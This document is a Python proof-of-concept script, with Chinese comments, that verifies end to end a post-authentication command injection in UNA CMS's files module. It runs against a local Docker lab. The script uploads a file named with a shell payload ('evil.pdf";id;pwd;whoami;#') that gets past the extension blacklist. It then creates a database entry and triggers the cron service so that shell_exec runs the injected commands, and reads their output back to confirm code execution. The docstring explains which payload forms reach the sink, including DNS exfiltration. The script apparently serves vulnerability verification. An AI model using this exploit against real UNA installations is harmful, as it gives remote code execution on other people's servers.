#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UNA CMS BxFilesModule CWE-78 Command Injection — 本地 Docker 端到端验证 (Python 版)
=============================================================================
验证链（全部使用真实 UNA 代码路径）:
  1. HTTP 真实登录态（复用 CLI 生成的 memberSession —— post-auth 前提）
  2. HTTP 真实上传入口 storage_uploader.php (uo=sys_html5, so=bx_files_files)
     —— HTML5 uploader 走 `file` 参数 -> BxDolStorage::storeFileFromXhr -> storeFile()
        （与前端浏览器行为一致；文件名经 URL 编码传输、服务端解码后保留原始 shell 元字符）
  3. 存储层真实校验: pathinfo() 保留元字符 + deny-allow 黑名单 in_array 精确匹配被绕过
     -> 恶意 ext 原样落库 bx_files_files.ext
  4. 以数据层创建 bx_files_main 条目 (data_processed=0) —— 等价于用户在前端提交文件条目
  5. 触发 cron service: BxDolService::call('bx_files', 'process_files_data')
     —— 与 sys_cron_jobs.bx_files_process_data (BxFilesCronProcessData::processing) 完全一致
     -> serviceProcessFilesData() -> shell_exec("...--text \"<tmp>/<remote_id>.<ext>\"")
  6. 注入命令 stdout 经 shell_exec 回写 bx_files_main.data —— 读取到 uid= 即 RCE 确认

关键可利用性约束（实测确认）:
  - 注入 payload 不可含 '/'：$sFilePath 随后会被 @file_put_contents() 当作多级路径创建，
    含 '/' 时中间目录不存在 -> 创建失败 -> file_exists()=false -> continue，
    shell_exec 根本不会到达。报告中的 curl/wget URL(含 "//") OOB payload 属不可达形式；
    无 '/' 内联 payload (pdf";id;#) 与 DNS 外带 (nslookup/ping 域名无 '/') 均可达。
"""
import subprocess
import sys
import time
import urllib.parse
import json

import requests

TARGET = "http://localhost:8080"
WEB = "una-web-1"
DB = "una-db-1"
MYSQL = ["docker", "exec", DB, "mysql", "-uuna", "-puna123", "una", "-N", "-e"]

C = {
    "G": "\033[92m", "R": "\033[91m", "Y": "\033[93m",
    "B": "\033[94m", "BD": "\033[1m", "X": "\033[0m",
}


def run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def sh(cmd):
    return run(["sh", "-c", cmd])


def mysql(q):
    r = run(MYSQL + [q])
    return r.stdout.strip()


def log(msg, level="I"):
    pre = {"I": f"{C['B']}[*]{C['X']}", "O": f"{C['G']}[+]{C['X']}",
           "F": f"{C['R']}[-]{C['X']}", "W": f"{C['Y']}[!]{C['X']}"}
    print(f"{pre[level]} {msg}")


def get_session():
    """CLI 内以 admin 身份登录 -> 返回 memberSession cookie 值（post-auth 前提）"""
    r = run(["docker", "exec", WEB, "php", "/var/www/html/gen_session_cli.php"])
    for line in r.stdout.splitlines():
        if line.startswith("memberSession="):
            return line.split("=", 1)[1].strip()
    return None


def upload_xhr(session_cookie, evil_filename, content=b"UNA RCE python e2e"):
    """真实 HTML5 上传：file 参数(URL编码) + 原始 body（php://input, storeFileFromXhr）"""
    uid = f"pye2e_{int(time.time())}_{os_urandom_hex()}"
    url = f"{TARGET}/storage_uploader.php"
    params = {"uo": "sys_html5", "so": "bx_files_files", "uid": uid,
              "a": "upload", "m": "1", "f": "json",
              "file": evil_filename}  # requests 会自动 URL 编码 file 参数
    hdr = {"Cookie": f"memberSession={urllib.parse.quote(session_cookie)}; memberID=1"}
    try:
        r = requests.post(url, params=params, data=content, headers=hdr, timeout=30)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def os_urandom_hex():
    import os
    return os.urandom(4).hex()


def main():
    print(f"{C['BD']}═══════════════════════════════════════════════════════════{C['X']}")
    print(f"{C['BD']} UNA BxFilesModule CWE-78 — Python 端到端本地验证{C['X']}")
    print(f"{C['BD']}═══════════════════════════════════════════════════════════{C['X']}\n")

    # [0] 前置检查
    log("检查容器与模块状态")
    mod = mysql("SELECT enabled FROM sys_modules WHERE name='bx_files'")
    cron = mysql("SELECT COUNT(*) FROM sys_cron_jobs WHERE name='bx_files_process_data'")
    storage = mysql("SELECT COUNT(*) FROM sys_objects_storage WHERE object='bx_files_files'")
    if mod != "1" or cron != "1" or storage != "1":
        log(f"前置缺失 module={mod} cron={cron} storage={storage}", "F")
        return 1
    log("bx_files 模块已启用 / cron job 已注册 / storage 对象存在", "O")

    # [1] 获取登录态
    sess = get_session()
    if not sess:
        log("无法生成登录 session", "F")
        return 1
    log(f"获得合法登录会话 (post-auth 前提满足): memberSession={sess[:12]}...")

    # [2] 上传恶意文件名（真实 HTTP 入口）
    ts = int(time.time())
    # payload: 无 '/'（关键约束），注入 id 输出会回写 bx_files_main.data
    evil = 'evil.pdf";id;pwd;whoami;#'
    log(f"上传恶意文件名: {evil}")
    code, resp = upload_xhr(sess, evil)
    log(f"HTTP {code} 响应: {resp[:200]}")
    file_id = None
    try:
        j = json.loads(resp)
        if j.get("success") == 1:
            file_id = j.get("id")
            log(f"上传成功 file_id={file_id}", "O")
        else:
            log(f"上传响应异常: {j}", "F")
            return 1
    except Exception:
        log("上传未返回 JSON（可能 filename 解析被服务端截断）", "F")
        return 1

    # [3] 核对落库 ext
    row = mysql(f"SELECT file_name, ext FROM bx_files_files WHERE id={int(file_id)}")
    log(f"DB bx_files_files 落库: {row}")
    fn, ext = row.split("\t", 1)
    if ';' in ext and '"' in ext:
        log("恶意 ext（含 \\\" ; #）已原样落库 → pathinfo+in_array 绕过确认", "O")
    else:
        log(f"ext 未保留元字符（实际='{ext}'）→ 该上传路径在此版本被截断，链路终止", "F")
        return 1

    # [4] 创建 bx_files_main 条目 (data_processed=0)
    pid = mysql("SELECT id FROM sys_profiles WHERE account_id=1 LIMIT 1") or "1"
    q = ("INSERT INTO bx_files_main (author,added,changed,file_id,title,cat,`desc`,`data`,"
         "data_processed,labels,location,allow_view_to,status,status_admin,type) VALUES "
         f"({int(pid)},{ts},{ts},{int(file_id)},'pye2e rce',0,'','',0,'','',3,'active','active','file')")
    mysql(q)
    cid = mysql("SELECT id FROM bx_files_main WHERE title='pye2e rce' AND file_id=" + str(int(file_id)) +
                " ORDER BY id DESC LIMIT 1")
    if not cid:
        log("bx_files_main 条目插入失败", "F")
        return 1
    log(f"bx_files_main 条目 content_id={cid} (data_processed=0)", "O")

    # [5] 触发 cron service（等价 BxFilesCronProcessData::processing）
    trigger_php = r'''<?php
$_SERVER['HTTP_HOST']='localhost'; $_SERVER['HTTP_USER_AGENT']='UNA';
$_ENV['UNA_SKIP_REDIRECT']='1'; $_ENV['UNA_SKIP_INSTALL_FOLDER_CHECK']='1';
require('/var/www/html/inc/header.inc.php');
$m = BxDolService::call('bx_files', 'process_files_data', array(3));
echo "SERVICE_RET=" . var_export($m, true) . "\n";
'''
    with open("/home/duskto/漏挖复审/UNA/tmp_trigger_cron.php", "w") as f:
        f.write(trigger_php)
    r = run(["docker", "exec", WEB, "php", "/var/www/html/tmp_trigger_cron.php"])
    log(f"cron service 触发输出: {r.stdout.strip()[:120]}")

    # [6] 读回写 data 字段验证注入
    time.sleep(0.3)
    row = mysql(f"SELECT data_processed, data FROM bx_files_main WHERE id={int(cid)}")
    dp, data = row.split("\t", 1)
    print(f"\n  {C['BD']}条目 {cid}: data_processed={dp}{C['X']}")
    print(f"  {C['BD']}data 字段内容:{C['X']}\n  " + data.replace("\n", "\n  "))
    if "uid=" in data and "root" in data:
        print(f"\n  {C['G']}{C['BD']}>>> 命令注入 → RCE 确认：注入的 id 命令 stdout 已通过 "
              f"shell_exec 回写 data 字段 <<<{C['X']}")
        return 0
    log("data 字段未发现 uid= 输出 —— 注入未执行", "F")
    return 1


if __name__ == "__main__":
    sys.exit(main())
